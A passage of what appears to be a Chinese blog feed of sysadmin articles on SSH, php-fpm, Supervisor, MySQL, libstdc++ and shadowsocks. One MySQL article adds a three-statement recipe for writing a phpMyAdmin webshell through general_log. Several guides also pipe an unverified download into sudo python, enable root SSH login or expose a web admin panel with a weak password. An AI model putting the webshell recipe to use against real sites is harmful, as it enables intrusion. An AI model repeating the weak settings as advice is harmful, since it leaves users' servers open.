    <content type="text"><![CDATA[ssh链接可以远程管理linux设备，默认端口是22，安装好系统默认是不开启的，需要修改配置文件 /etc/ssh/sshd_config 配置文件 1.找到#PasswordAuthentication yes 把#的注释去掉 2.将PermitRootLogin without-password修改为： PermitRootLogin yes 3.然后启动ssh服务 : /etc/init.d/ssh start 4.然后设置开机自动启动 : update-rc.d ssh enable 5.使用xshell链接即可]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[优化你的php-fpm(php5.3+）让你的网站跑得更快]]></title>
    <url>%2Farticles%2F%E4%BC%98%E5%8C%96%E4%BD%A0%E7%9A%84php-fpm-php5-3-%EF%BC%89%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E8%B7%91%E5%BE%97%E6%9B%B4%E5%BF%AB%2F</url>
    <content type="text"><![CDATA[从php5.3以后php自带了php-fpm不是和php5.2一样以插件的方式存在了。这给我们带来一个好处502没有那么容易出现了,用linux的绝大多数应该还是在用小军的lnmp的那个包，但是配置优化却是不尽人意。 php-fpm的配置文件位置： /usr/local/php/etc/php-fpm.conf pid = run/php-fpm.pid pid设置，默认在安装目录中的var/run/php-fpm.pid，建议开启 error_log = log/php-fpm.log 错误日志，默认在安装目录中的var/log/php-fpm.log log_level = notice 错误级别. 可用级别为: alert（必须立即处理）, error（错误情况）, warning（警告情况）, notice（一般重要信息）, debug（调试信息）. 默认: notice. emergency_restart_threshold = 60 emergency_restart_interval = 60s 表示在emergency_restart_interval所设值内出现SIGSEGV或者SIGBUS错误的php-cgi进程数如果超过 emergency_restart_threshold个，php-fpm就会优雅重启。这两个选项一般保持默认值。 process_control_timeout = 0 设置子进程接受主进程复用信号的超时时间. 可用单位: s(秒), m(分), h(小时), 或者 d(天) 默认单位: s(秒). 默认值: 0. daemonize = yes 后台执行fpm,默认值为yes，如果为了调试可以改为no。 在FPM中，可以使用不同的设置来运行多个进程池。 这些设置可以针对每个进程池单独设置。 listen = 127.0.0.1:9000 fpm监听端口，即nginx中php处理的地址，一般默认值即可。 可用格式为: ip:port, port, /path/to/unix/socket. 每个进程池都需要设置. listen.backlog = -1 backlog数，-1表示无限制，由操作系统决定，此行注释掉就行。backlog含义参考： listen.allowed_clients = 127.0.0.1 允许访问FastCGI进程的IP，设置any为不限制IP，如果要设置其他主机的nginx也能访问这台FPM进程，listen处要设置成本地可被访问的IP。默认值是any。 每个地址是用逗号分隔. 如果没有设置或者为空，则允许任何服务器请求连接 listen.owner = www listen.group = www listen.mode = 0666 unix socket设置选项，如果使用tcp方式访问，这里注释即可。 user = www group = www 启动进程的帐户和组 pm = dynamic pm表示使用那种方式，有两个值可以选择，就是static（静态模式）或者dynamic（动态模式5.2的时候叫apache-like但是不好使） 如果选择static，则由pm.max_children指定固定的子进程数。 如果选择dynamic，则由下开参数决定： pm.max_children ，子进程最大数 pm.start_servers ，启动时的进程数 pm.min_spare_servers ，保证空闲进程数最小值，如果空闲进程小于此值，则创建新的子进程 pm.max_spare_servers ，保证空闲进程数最大值，如果空闲进程大于此值，此进行清理 对于专用服务器，pm可以设置为static。 pm.max_requests = 1000 设置每个子进程重生之前服务的请求数. 对于可能存在内存泄漏的第三方模块来说是非常有用的. 如果设置为 ‘0′ 则一直接受请求. 等同于 PHP_FCGI_MAX_REQUESTS 环境变量. 默认值: 0. pm.status_path = /status FPM状态页面的网址. 如果没有设置, 则无法访问状态页面. 默认值: none. ping.path = /ping FPM监控页面的ping网址. 如果没有设置, 则无法访问ping页面. 该页面用于外部检测FPM是否存活并且可以响应请求. 请注意必须以斜线开头 (/)。 ping.response = pong 用于定义ping请求的返回相应. 返回为 HTTP 200 的 text/plain 格式文本. 默认值: pong. request_terminate_timeout = 0 设置单个请求的超时中止时间. 该选项可能会对php.ini设置中的’max_execution_time’因为某些特殊原因没有中止运行的脚本有用. 设置为 ‘0′ 表示 ‘Off’. 当经常出现502错误时可以尝试更改此选项。 request_slowlog_timeout = 10s 当一个请求该设置的超时时间后，就会将对应的PHP调用堆栈信息完整写入到慢日志中. 设置为 ‘0′ 表示 ‘Off’ slowlog = log/$pool.log.slow 慢请求的记录日志,配合request_slowlog_timeout使用 rlimit_files = 1024 设置文件打开描述符的rlimit限制. 默认值: 系统定义值 系统默认可打开句柄是1024，可使用 ulimit -n查看，ulimit -n 2048修改。 rlimit_core = 0 设置核心rlimit最大限制值. 可用值: ‘unlimited’ 、0或者正整数. 默认值: 系统定义值. chroot = 启动时的Chroot目录. 所定义的目录需要是绝对路径. 如果没有设置, 则chroot不被使用. chdir = 设置启动目录，启动时会自动Chdir到该目录. 所定义的目录需要是绝对路径. 默认值: 当前目录，或者/目录（chroot时） catch_workers_output = yes 重定向运行过程中的stdout和stderr到主要的错误日志文件中. 如果没有设置, stdout 和 stderr 将会根据FastCGI的规则被重定向到 /dev/null . 默认值: 空 下面已我的php配置例子： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182[global]pid = /usr/local/php/var/run/php-fpm.piderror_log = /home/wwwlogs/php-fpm.loglog_level = noticerlimit_files = 65535rlimit_core = 0[www]listen = /tmp/php-cgi.sockuser = nobody nginx, php-fpm进程的权限不能以网站所有权运行安全有问题group = nobody nginx, php-fpm 进程 的权限不能以网站所有权运行安全有问题pm = dynamicpm.max_children = 36 静态模式开启进程数pm.start_servers = 9 动态模式默认开启进程 数pm.min_spare_servers = 8 动态模式默认最低保留进程 数pm.max_spare_servers = 36 动态模式默认最高 进程数具体通过netstat -napo |grep "php-fpm" | wc -l和系统负载确定pm.max_requests = 4096 进程执行xxx后重启释放内存避免内存泄漏request_terminate_timeout = 100 进程超时时间request_slowlog_timeout = 3s 记录大于3秒的php执行命令slowlog = /home/wwwlogs/php-fpm.log.slowrlimit_files = 65535 这个值一定要改默认的太小不改日志会有错误但是要和全局文件数相同具体查看ulimit -n系统全局设置rlimit_core = 0 [global]pid = /usr/local/php/var/run/php-fpm.piderror_log = /home/wwwlogs/php-fpm.loglog_level = noticerlimit_files = 65535rlimit_core = 0[www]listen = /tmp/php-cgi.sockuser = nobodygroup = nobodypm = dynamticpm.max_children = 20pm.start_servers = 2pm.min_spare_servers = 1pm.max_spare_servers = 20pm.max_requests = 4096request_slowlog_timeout = 3sslowlog = /home/wwwlogs/php-fpm.log.slowrequest_terminate_timeout = 100rlimit_files = 65535rlimit_core = 0 相关链接： 分析502服务器错误 总结： 1、每个进程约占用20-25M内存， top命令查询空闲内存大小， max_children = 空闲内存 / 20~25 2、request_terminate_timeout 默认是0 ， 表示请求不中断，如果一个外部链接请求不到资源， 就会一直阻塞。所以这个时间需要和php.ini里面的执行时间保持一直。 3、修改 php.ini 的 内存限制 memory_limit = 128M （5个进程的大小）甚至更大]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Supervisor进行管理工具]]></title>
    <url>%2Farticles%2FSupervisor%E8%BF%9B%E8%A1%8C%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[Supervisor（http://supervisord.org/）是用Python开发的一个client/server服务，是Linux/Unix系统下的一个进程管理工具，不支持Windows系统。它可以很方便的监听、启动、停止、重启一个或多个进程。用Supervisor管理的进程，当一个进程意外被杀死，supervisort监听到进程死后，会自动将它重新拉起，很方便的做到进程自动恢复的功能，不再需要自己写shell脚本来控制。 因为Supervisor是Python开发的，安装前先检查一下系统否安装了Python2.4以上版本。下面以CentOS7，Python2.7版本环境下，介绍Supervisor的安装与配置步聚： 1、安装Python包管理工具 （easy_install）easy_install是setuptools包里带的一个命令，使用easy_install实际上是在调用setuptools来完成安装模块的工作,所以安装setuptools即可。 1wget --no-check-certificate &#123;url:https://bootstrap.pypa.io/ez_setup.py&#125; -O - | sudo python 2、安装supervisoreasy_install supervisor supervisor安装完成后会生成三个执行程序：supervisortd、supervisorctl、echo_supervisord_conf，分别是supervisor的守护进程服务（用于接收进程管理命令）、客户端（用于和守护进程通信，发送管理进程的指令）、生成初始配置文件程序。 3、配置 运行supervisord服务的时候，需要指定supervisor配置文件，如果没有显示指定，默认在以下目录查找： 1234567891011$CWD/supervisord.conf$CWD/etc/supervisord.conf/etc/supervisord.conf/etc/supervisor/supervisord.conf (since Supervisor 3.3.0)../etc/supervisord.conf (Relative to the executable)../supervisord.conf (Relative to the executable) $CWD表示运行supervisord程序的目录。 可以通过运行echo_supervisord_conf程序生成supervisor的初始化配置文件，如下所示： 123mkdir /etc/supervisorecho_supervisord_conf &gt; /etc/supervisor/supervisord.conf 4、配置文件参数说明 supervisor的配置参数较多，下面介绍一下常用的参数配置，详细的配置及说明，请参考官方文档介绍。 注：分号（;）开头的配置表示注释 1234567891011121314151617181920212223242526272829303132333435363738394041424344[unix_http_server]file=/tmp/supervisor.sock ;UNIX socket 文件，supervisorctl 会使用;chmod=0700 ;socket文件的mode，默认是0700;chown=nobody:nogroup ;socket文件的owner，格式：uid:gid;[inet_http_server] ;HTTP服务器，提供web管理界面;port=127.0.0.1:9001 ;Web管理后台运行的IP和端口，如果开放到公网，需要注意安全性;username=user ;登录管理后台的用户名;password=123 ;登录管理后台的密码[supervisord]logfile=/tmp/supervisord.log ;日志文件，默认是 $CWD/supervisord.loglogfile_maxbytes=50MB ;日志文件大小，超出会rotate，默认 50MB，如果设成0，表示不限制大小logfile_backups=10 ;日志文件保留备份数量默认10，设为0表示不备份loglevel=info ;日志级别，默认info，其它: debug,warn,tracepidfile=/tmp/supervisord.pid ;pid 文件nodaemon=false ;是否在前台启动，默认是false，即以 daemon 的方式启动minfds=1024 ;可以打开的文件描述符的最小值，默认 1024minprocs=200 ;可以打开的进程数的最小值，默认 200[supervisorctl]serverurl=unix:///tmp/supervisor.sock ;通过UNIX socket连接supervisord，路径与unix_http_server部分的file一致;serverurl=http://127.0.0.1:9001 ; 通过HTTP的方式连接supervisord; [program:xx]是被管理的进程配置参数，xx是进程的名称[program:xx]command=/opt/apache-tomcat-8.0.35/bin/catalina.sh run ; 程序启动命令autostart=true ; 在supervisord启动的时候也自动启动startsecs=10 ; 启动10秒后没有异常退出，就表示进程正常启动了，默认为1秒autorestart=true ; 程序退出后自动重启,可选值：[unexpected,true,false]，默认为unexpected，表示进程意外杀死后才重启startretries=3 ; 启动失败自动重试次数，默认是3user=tomcat ; 用哪个用户启动进程，默认是rootpriority=999 ; 进程启动优先级，默认999，值小的优先启动redirect_stderr=true ; 把stderr重定向到stdout，默认falsestdout_logfile_maxbytes=20MB ; stdout 日志文件大小，默认50MBstdout_logfile_backups = 20 ; stdout 日志文件备份数，默认是10; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件）stdout_logfile=/opt/apache-tomcat-8.0.35/logs/catalina.outstopasgroup=false ;默认为false,进程被杀死时，是否向这个进程组发送stop信号，包括子进程killasgroup=false ;默认为false，向进程组发送kill信号，包括子进程;包含其它配置文件[include]files = relative/directory/*.ini ;可以指定一个或多个以.ini结束的配置文件 5、配置管理进程 进程管理配置参数，不建议全都写在supervisord.conf文件中，应该每个进程写一个配置文件放在include指定的目录下包含进supervisord.conf文件中。 1&gt; 创建/etc/supervisor/config.d目录，用于存放进程管理的配置文件 2&gt; 修改/etc/supervisor/supervisord.conf中的include参数，将/etc/supervisor/conf.d目录添加到include中 123[include]files = /etc/supervisor/config.d/*.ini 下面是配置Tomcat进程的一个例子： 1234567891011121314151617[program:tomcat]command=/opt/apache-tomcat-8.0.35/bin/catalina.sh runstdout_logfile=/opt/apache-tomcat-8.0.35/logs/catalina.outautostart=trueautorestart=truestartsecs=5priority=1stopasgroup=truekillasgroup=true 5、启动Supervisor服务 supervisord -c /etc/supervisor/supervisord.conf 6、控制进程 6.1 交互终端 supervisord启动成功后，可以通过supervisorctl客户端控制进程，启动、停止、重启。运行supervisorctl命令，不加参数，会进入supervisor客户端的交互终端，并会列出当前所管理的所有进程。 上图中的tomcat就是我们在配置文件中[program:tomcat]指定的名字。 输入help可以查看可以执行的命令列表，如果想看某个命令的作用，运行help 命令名称，如：help stop stop tomcat // 表示停止tomcat进程 stop all // 表示停止所有进程 // … 6.2 bash终端 1234567891011supervisorctl statussupervisorctl stop tomcatsupervisorctl start tomcatsupervisorctl restart tomcatsupervisorctl rereadsupervisorctl update 6.3 Web管理界面 出于安全考虑，默认配置是没有开启web管理界面，需要修改supervisord.conf配置文件打开http访权限，将下面的配置： 1234567;[inet_http_server] ; inet (TCP) server disabled by default;port=127.0.0.1:9001 ; (ip_address:port specifier, *:port for all iface);username=user ; (default is no username (open server));password=123 ; (default is no password (open server)) 修改成： 12345678910111213[inet_http_server] ; inet (TCP) server disabled by defaultport=0.0.0.0:9001 ; (ip_address:port specifier, *:port for all iface)username=user ; (default is no username (open server))password=123 ; (default is no password (open server))port：绑定访问IP和端口，这里是绑定的是本地IP和9001端口username：登录管理后台的用户名password：登录管理后台的密码 7、开机启动Supervisor服务 7.1 配置systemctl服务 1&gt; 进入/lib/systemd/system目录，并创建supervisor.service文件 12345678910111213141516171819202122232425[Unit]Description=supervisorAfter=network.target[Service]Type=forkingExecStart=/usr/bin/supervisord -c /etc/supervisor/supervisord.confExecStop=/usr/bin/supervisorctl $OPTIONS shutdownExecReload=/usr/bin/super visorctl $OPTIONS reloadKillMode=processRestart=on-failureRestartSec=42s[Install]WantedBy=multi-user.target 2&gt; 设置开机启动 123systemctl enable supervisor.servicesystemctl daemon-reload 3、修改文件权限为766 1chmod 766 supervisor.service 7.2 配置service类型服务 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#!/bin/bash# supervisord This scripts turns supervisord on# Author: Mike McGrath &lt;mmcgrath@redhat.com&gt; (based off yumupdatesd)# chkconfig: - 95 04# description: supervisor is a process control utility. It has a web based# xmlrpc interface as well as a few other nifty features.# processname: supervisord# config: /etc/supervisor/supervisord.conf# pidfile: /var/run/supervisord.pid# source function library. /etc/rc.d/init.d/functionsRETVAL=0start() &#123; echo -n $&quot;Starting supervisord: &quot; daemon &quot;supervisord -c /etc/supervisor/supervisord.conf &quot; RETVAL = $? echo [ $RETVAL -eq 0 ] &amp;&amp; touch /var/lock/subsys/supervisord&#125;stop() &#123; echo -n $&quot;Stopping supervisord: &quot; kill proc supervisord echo [ $RETVAL -eq 0 ] &amp;&amp; rm -f /var/lock/subsys/supervisord&#125;restart() &#123; stop start&#125;case &quot;$1&quot; in start) start ;; stop) stop ;; restart|force-reload|reload) restart ;; condrestart) test -f /var/lock/subsys/supervisord &amp;&amp; restart ;; status) status supervisord RETVAL=$? ;; *) echo $&quot;Usage: $0 &#123;start|stop|status|restart|reload|force-reload|condrestart&#125;&quot; exit 1esac exit $RETVA 将上述脚本内容保存到/etc/rc.d/init.d/supervisor文件中，修改文件权限为755，并设置开机启动 123chmod 755 /etc/rc.d/init.d/supervisorchkconfig supervisor on 注意：修改脚本中supervisor配置文件路径为你的supervisor的配置文件路径 其它Linux发行版开机启动脚本：https://github.com/Supervisor/initscripts 注意： Supervisor只能管理非daemon的进程，也就是说Supervisor不能管理守护进程。否则提示Exited too quickly (process log may have details)异常。例子中的Tomcat默认是以守护进程启动的，所以我们改成了catalina.sh run，以前台进程的方式运行。 yum方式安装 123yum install epel-releaseyum install -y supervisor supervisor没有发布在标准的CentOS源在，需要安装epel源。这种方式安装的可能不是最新版本，但比较方便，安装完成之后，配置文件会自动帮你生成。 默认配置文件：/etc/supervisord.conf 进程管理配置文件放到：/etc/supervisord.d/目录下即可 默认日志文件：/tmp/supervisord.log，可以查看进程的启动信息]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux解压文件到指定目录]]></title>
    <url>%2Farticles%2FLinux%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95%2F</url>
    <content type="text"><![CDATA[tar在Linux上是常用的打包、压缩、加压缩工具，他的参数很多，折里仅仅列举常用的压缩与解压缩参数 参数： 123456789-c ：create 建立压缩档案的参数；-x ： 解压缩压缩档案的参数；-z ： 是否需要用gzip压缩；-v： 压缩的过程中显示档案；-f： 置顶文档名，在f后面立即接文件名，不能再加参数 举例： 将整个/home/www/images 目录下的文件全部打包为 /home/www/images.tar tar -cvf /home/www/images.tar /home/www/images ← 仅打包，不压缩tar -zcvf /home/www/images.tar.gz /home/www/images ← 打包后，以gzip压缩 在参数f后面的压缩文件名是自己取的，习惯上用tar来做，如果加z参数，则以tar.gz 或tgz来代表gzip压缩过的tar file文件 1 将tgz文件解压到指定目录 tar zxvf test.tgz -C 指定目录 比如将/source/kernel.tgz解压到 /source/linux-2.6.29 目录 tar zxvf /source/kernel.tgz -C /source/ linux-2.6.29 2 将指定目录压缩到指定文件 比如将linux-2.6.29 目录压缩到 kernel.tgz tar czvf kernel.tgz linux-2.6.29]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MySQL server has gone away]]></title>
    <url>%2Farticles%2FMySQL%20server%20has%20gone%20away%2F</url>
    <content type="text"><![CDATA[工作中经常需要导入或者导出较大的sql文件。导出时一般没问题，但在导入到其它Mysql库中，可能会出现 Packet for query is too large (1706 &gt; 1024). You can change this value on the server by setting the max_allowed_packet&#39; variable. 或者程序（如python里面executemany）在插入大量数据时出现 MySQL server has gone away 这些错误都可能是Mysql的mysql max_allowed_packet默认值太小。修改该值一般游两种方式。 方式一：sql语句修改 1、首先登陆mysql查看当前该值的大小。 show variables like ‘%max_allowed_packet%’ 2、修改其大小为1G set global max_allowed_packet = 102410241024 注意： 这种修改方式修改后，需要重新登陆Mysql查看，才能看到修改后的值，并且，这种方式修改的mysql max_allowed_packet，在Mysql重启后，可能失效。 方式二：my.ini修改 1、在my.ini 或 my.cnf 文件中添加如下语句。比如：改为1G。 如下图所示。修改完成后，需要重启mysql。 注意：这种方式 max_allowed_packet 一定是添加在【mysqld】才能生效。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MySQL开启general_log跟踪sql执行记录]]></title>
    <url>%2Farticles%2FMySQL%E5%BC%80%E5%90%AFgeneral-log%E8%B7%9F%E8%B8%AAsql%E6%89%A7%E8%A1%8C%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[设置general log保存路径,注意在Linux中只能设置到 /tmp 或 /var 文件夹下，设置其他路径出错,同时需要root用户才有访问此文件的权限，代码如下： 12345mysql&gt; set global general_log_file='/tmp/general.lg'; #设置路径mysql&gt; set global general_log=on; # 开启general log模式mysql&gt; set global general_log=off; # 关闭general log模式 命令行设置即可,无需重启 在general log模式开启过程中，所有对数据库的操作都将被记录 general.log 文件 或 可以将日志记录在表中, 如下 1mysql&gt;set global log_output='table' 运行后,可以在mysql数据库下查找 general_log表 延伸： 根据上面的原理我们可以根据三个sql语句拿下phpmyadmin的shell 12345mysql&gt; set global general_log='on';mysql&gt; SET global general_log_file='D:/webshell/www/cmd.php';mysql&gt; SELECT 'shell code';]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[深入理解PHP之foreach]]></title>
    <url>%2Farticles%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E4%B9%8Bforeach%2F</url>
    <content type="text"><![CDATA[如下代码运行结果为何不是 1/2/3 ？ 如何解决此类问题呢? PHP手册上有一段提醒: Warning: 数组最后一个元素的 $value 引用在 foreach 循环之后仍会保留。建议使用 unset() 来将其销毁。]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[No module named yum]]></title>
    <url>%2Farticles%2FNo%20module%20named%20yum%2F</url>
    <content type="text"><![CDATA[安装如下方法安装python2.7： 1234567yum install –y python27 python27-devel python-docutilscd /usr/bin/rm -rf pythoncp python2.7 python 出现yum错误：No module named yum 解决方法，查看 /usr/bin下python有哪几个版本 1ll /usr/bin 我这里是：2.6 和 2.7 （刚安装的） 由于yum命令不兼容python2.7，需修改/usr/bin/yum文件，将第一行由“#!/usr/bin/python”改为“#!/usr/bin/python2.6”]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[nginx 解析异常]]></title>
    <url>%2Farticles%2Fnginx%20%E8%A7%A3%E6%9E%90%E5%BC%82%E5%B8%B8%2F</url>
    <content type="text"><![CDATA[上面的配置在 nginx/1.10.2 正常 ， 而在 nginx/1.9.10中会得到如下解析 aaa.com/api 错误 aaa.com/api/api 正常]]></content>
  </entry>
  <entry>
    <title><![CDATA[/usr/lib/libstdc++.so.6： version `GLIBCXX_3.4.15' not found错误的解决]]></title>
    <url>%2Farticles%2Fusr-lib-libstdc-so-6-%20version%20-GLIBCXX-3-4-15-%20not%20found%E9%94%99%E8%AF%AF%E7%9A%84%E8%A7%A3%E5%86%B3%2F</url>
    <content type="text"><![CDATA[升级cmake时，提示“Error when bootstrapping CMake:Problem while running initial CMake”，第二次运行./bootstrap时，直接的给出了错误原因： 1234567891011121314151617[root@localhost cmake-2.8.12.2]# ./bootstrap---------------------------------------------gmake: “cmake”是最新的。/home/src/cmake-2.8.12.2/Bootstrap.cmk/cmake: /usr/lib64/libstdc++.so.6: version `GLIBCXX_3.4.15&apos; not found (required by /home/src/cmake-2.8.12.2/Bootstrap.cmk/cmake)---------------------------------------------Error when bootstrapping CMake:Problem while running initial CMake---------------------------------------------缺少GLIBCXX_3.4.15版本，或是更高的版本。 为了核实版本问题： 123456789101112131415161718192021222324252627282930313233[root@localhost cmake-2.8.12.2]# strings /usr/lib64/libstdc++.so.6 | grep GLIBCXXGLIBCXX_3.4GLIBCXX_3.4.1GLIBCXX_3.4.2GLIBCXX_3.4.3GLIBCXX_3.4.4GLIBCXX_3.4.5GLIBCXX_3.4.6GLIBCXX_3.4.7GLIBCXX_3.4.8GLIBCXX_3.4.9GLIBCXX_3.4.10GLIBCXX_3.4.11GLIBCXX_3.4.12GLIBCXX_3.4.13GLIBCXX_FORCE_NEWGLIBCXX_DEBUG_MESSAGE_LENGTH 我们看到当前GCC版本中的确没有GLIBCXX_3.4.15,考虑到刚安装过新版的GCC ,似乎不应该出现这样的问题。 顺着gcc安装路径，找到了新的libstdc++： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[root@localhost cmake-2.8.12.2]# strings /usr/local/lib64/libstdc++.so.6.0.20|grep GLIBCXXGLIBCXX_3.4GLIBCXX_3.4.1GLIBCXX_3.4.2GLIBCXX_3.4.3GLIBCXX_3.4.4GLIBCXX_3.4.5GLIBCXX_3.4.6GLIBCXX_3.4.7GLIBCXX_3.4.8GLIBCXX_3.4.9GLIBCXX_3.4.10GLIBCXX_3.4.11GLIBCXX_3.4.12GLIBCXX_3.4.13GLIBCXX_3.4.14GLIBCXX_3.4.15GLIBCXX_3.4.16GLIBCXX_3.4.17GLIBCXX_3.4.18GLIBCXX_3.4.19GLIBCXX_3.4.20GLIBCXX_FORCE_NEWGLIBCXX_DEBUG_MESSAGE_LENGTH 这里该有的都有了，把这份软链到正确的地方，就妥了。 12345678910111213141516[root@localhost cmake-2.8.12.2]# cp /usr/local/lib64/libstdc++.so.6.0.20 /usr/lib64/[root@localhost cmake-2.8.12.2]# cd /usr/lib64/[root@localhost lib64]# rm -f libstdc++.so.6[root@localhost lib64]# ln -s libstdc++.so.6.0.20 libstdc++.so.6[root@localhost lib64]# ll libstdc*lrwxrwxrwx. 1 root root 19 5月 12 13:34 libstdc++.so.6 -&gt; libstdc++.so.6.0.20-rwxr-xr-x. 1 root root 987096 11月 22 02:08 libstdc++.so.6.0.13-rwxr-xr-x. 1 root root 6700716 5月 12 13:33 libstdc++.so.6.0.20 此后，再进行编译安装就顺畅了： 123456./bootstrapgmakemake install]]></content>
  </entry>
  <entry>
    <title><![CDATA[MySQL中trim()函数的用法]]></title>
    <url>%2Farticles%2FMySQL%E4%B8%ADtrim-%E5%87%BD%E6%95%B0%E7%9A%84%E7%94%A8%E6%B3%95%2F</url>
    <content type="text"><![CDATA[trim函数可以过滤指定的字符串： 完整格式：TRIM([{BOTH | LEADING | TRAILING} [remstr] FROM] str) 简化格式：TRIM([remstr FROM] str) 返回字符串 str ， 其中所有remstr前缀和/或后缀都已被删除。若分类符BOTH、LEADIN或TRAILING中没有一个是给定的,则假设为BOTH。remstr为可选项，在未指定情况下，可删除空格。 123456789101112131415mysql&gt; SELECT TRIM(&apos; bar &apos;);-&gt; &apos;bar&apos;mysql&gt; SELECT TRIM(LEADING &apos;x&apos; FROM &apos;xxxbarxxx&apos;); --删除指定的首字符 x-&gt; &apos;barxxx&apos;mysql&gt; SELECT TRIM(BOTH &apos;x&apos; FROM &apos;xxxbarxxx&apos;); --删除指定的首尾字符 x-&gt; &apos;bar&apos;mysql&gt; SELECT TRIM(TRAILING &apos;xyz&apos; FROM &apos;barxxyz&apos;); --删除指定的尾字符 x-&gt; &apos;barx&apos; mysql中的去除左空格函数: LTRIM(str); 123mysql&gt; SELECT LTRIM(&apos; barbar&apos;);-&gt; &apos;barbar&apos; mysql中的去除右空格函数： RTRIM(str): 123mysql&gt; SELECT RTRIM(&apos;barbar &apos;);-&gt; &apos;barbar&apos;]]></content>
  </entry>
  <entry>
    <title><![CDATA[php 读取中文目录报错]]></title>
    <url>%2Farticles%2Fphp%20%E8%AF%BB%E5%8F%96%E4%B8%AD%E6%96%87%E7%9B%AE%E5%BD%95%E6%8A%A5%E9%94%99%2F</url>
    <content type="text"><![CDATA[问题的发现： （1）在php文件所在目录，手动创建了文件名为“测试.txt”和“test.txt”的文件； （2）执行下列代码： 123&lt;?phpvar_dump(file_exits("测试.txt")); // falsevar_dump(file_exits("test.txt")); // true 分析原因： 编码的不一样，导致文件系统无法识别UTF8编码下的中文路径； 解决方法: 1var_dump(file_exits(iconv('UTF-8','GB2312',"测试.txt")));// true *在使用非ASCII码表字符时，必须考虑的以下几个问题是： （1）操作系统的编码； （2）存储环境的编码； （3）代码文件的编码； （4）目标运行环境的编码]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[cURL error 60：SSL certificate problem]]></title>
    <url>%2Farticles%2FcURL%20error%2060-%20SSL%20certificate%20problem%2F</url>
    <content type="text"><![CDATA[问题描述: php在curl的时候报此错误： cURL error 60: SSL certificate problem: unable to get local issuer certificate (see http://curl.haxx.se/libcurl/c/libcurl-errors.html) 根据报错后面提示的地址查询60错误： CURLE_SSL_CACERT (60)Peer certificate cannot be authenticated with known CA certificates. 解决方法: 关于“SSL证书问题：无法获取本地颁发者证书”错误。显然，这适用于发送CURL请求的系统（并且没有接收请求的服务器） 1）从 https://curl.haxx.se/ca/cacert.pem 下载最新的cacert.pem 2）将以下行添加到php.ini curl.cainfo={放证书的目录}/cacert.pem 3）默认情况下，FastCGI进程将每隔300秒解析新文件（如果需要，您可以通过添加几个文件来更改频率）]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[shadowsock搭建服务端与客户端]]></title>
    <url>%2Farticles%2Fshadowsock%E6%90%AD%E5%BB%BA%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%2F</url>
    <content type="text"><![CDATA[1、安装 shadowsocks 服务端 ss 的客户端有很多语言实现，包括 Python、Go、libev等，这里使用广泛的 Python 后端。 12345sudo apt-get updatesudo apt-get install python-pipsudo pip install shadowsocks （如果有安装过pip的可以不用重新安装pip了） 此时系统会多出来两个程序： /usr/bin/ssserver /usr/bin/sslocal 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849ubuntu@ubuntu-System:~$ ssserver -husage: ssserver [OPTION]...A fast tunnel proxy that helps you bypass firewalls.You can supply configurations via either config file or command line arguments.Proxy options:-c CONFIG path to config file-s SERVER_ADDR server address, default: 0.0.0.0-p SERVER_PORT server port, default: 8388-k PASSWORD password-m METHOD encryption method, default: aes-256-cfb-t TIMEOUT timeout in seconds, default: 300--fast-open use TCP_FASTOPEN, requires Linux 3.7+--workers WORKERS number of workers, available on Unix/Linux--forbidden-ip IPLIST comma seperated IP list forbidden to connect--manager-address ADDR optional server manager UDP address, see wikiGeneral options:-h, --help show this help message and exit-d start/stop/restart daemon mode--pid-file PID_FILE pid file for daemon mode--log-file LOG_FILE log file for daemon mode--user USER username to run as-v, -vv verbose mode-q, -qq quiet mode, only show warnings/errors--version show version informationOnline help: https://github.com/shadowsocks/shadowsocks (Removed according to regulations.) 2、配置shadowsocks sudo gedit /etc/shadowsocks.json 然后会跳出一个文本框，粘贴以下内容 1234567891011121314151617181920&#123; "server":"0.0.0.0", // 代理IP "server_port":8899, // 代理端口 "local_address": "127.0.0.1", "local_port":1080, "password":"xxxxxxxx", //链接密码 "timeout":300, "method":"aes-256-cfb", "fast_open": true, "workers": 1&#125; 一个端口只能连一个用户。多用户时使用如下配置: 1234567891011121314151617181920212223242526&#123; "server":"0.0.0.0", #填入你的IP地址 "local_address": "127.0.0.1", "local_port":1080, "port_password": &#123; "8381": "foobar1", #端口号，密码 "8382": "foobar2", "8383": "foobar3", "8384": "foobar4" &#125;, "timeout":300, "method":"aes-256-cfb", "fast_open": false&#125; 修改成你自己的服务器信息。保存退出。 3、启动shadowsocks 1sudo sslocal -c /etc/shadowsocks.json -d start 4、windows客户端: ss客户端下载链接 在这里能找到所有历史版本和最新版本。直接下载后解压缩就可以用。 .NET下载链接 可能会提示你安装.NET 4.6.2。我的是shadowsock v4.0.6。要安装这个包。 .NET 